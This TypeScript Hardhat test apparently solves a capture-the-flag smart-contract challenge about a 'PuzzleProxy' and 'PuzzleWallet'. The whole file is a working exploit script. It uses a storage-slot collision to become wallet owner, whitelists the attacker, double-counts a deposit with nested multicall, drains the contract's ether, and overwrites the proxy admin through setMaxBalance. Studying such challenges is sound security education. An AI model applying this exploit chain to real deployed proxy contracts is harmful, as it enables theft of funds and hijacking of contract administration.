import { TransactionResponse } from "@ethersproject/providers"
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import { expect } from "chai"
import { Contract } from "ethers"
// @ts-ignore
import { ethers } from "hardhat"
import { PuzzleProxy__factory, PuzzleWallet__factory } from "../typechain"

const PROXY_NAME = "PuzzleProxy"
const PUZZLE_NAME = "PuzzleWallet"

describe(PROXY_NAME, () => {
    let owner, attacker: SignerWithAddress
    let proxy, puzzle: Contract
    let tx: TransactionResponse

    it("Should be possible to hijack the wallet to become the admin of the proxy", async () => {
        [ owner, attacker ] = await ethers.getSigners()

        puzzle = await new PuzzleWallet__factory(owner).deploy()

        const MAX_BALANCE = ethers.utils.parseEther("1000000")
        const iface = new ethers.utils.Interface(["function init(uint256)"])
        const data = iface.encodeFunctionData("init", [MAX_BALANCE])

        proxy = await new PuzzleProxy__factory(owner).deploy(owner.address, puzzle.address, data)

        tx = await owner.sendTransaction({
            to: proxy.address,
            value: ethers.utils.parseEther("0.001"),
            gasLimit: 1000000
        })
        await tx.wait()

        expect(await proxy.admin()).to.eq(owner.address)

        await proxy.connect(attacker).proposeNewAdmin(attacker.address)

        puzzle = puzzle.attach(proxy.address)
        expect(await puzzle.owner()).to.eq(attacker.address)

        await puzzle.connect(attacker).addToWhitelist(attacker.address)
        expect(await puzzle.whitelisted(attacker.address)).to.be.true

        const data1 = puzzle.interface.encodeFunctionData("deposit")
        const data2 = puzzle.interface.encodeFunctionData("multicall", [[data1]])

        await puzzle.connect(attacker).multicall([data1, data2], 
            { value: ethers.utils.parseEther("0.001"), gasLimit: 1000000 })
        expect(await puzzle.balances(attacker.address)).to.be.eq(ethers.utils.parseEther("0.002"))

        await puzzle.connect(attacker).execute(attacker.address, ethers.utils.parseEther("0.002"), "0x")
        expect(await ethers.provider.getBalance(puzzle.address)).to.be.eq(0)

        await puzzle.connect(attacker).setMaxBalance(attacker.address)
        expect(await proxy.admin()).to.be.eq(attacker.address)
    })
})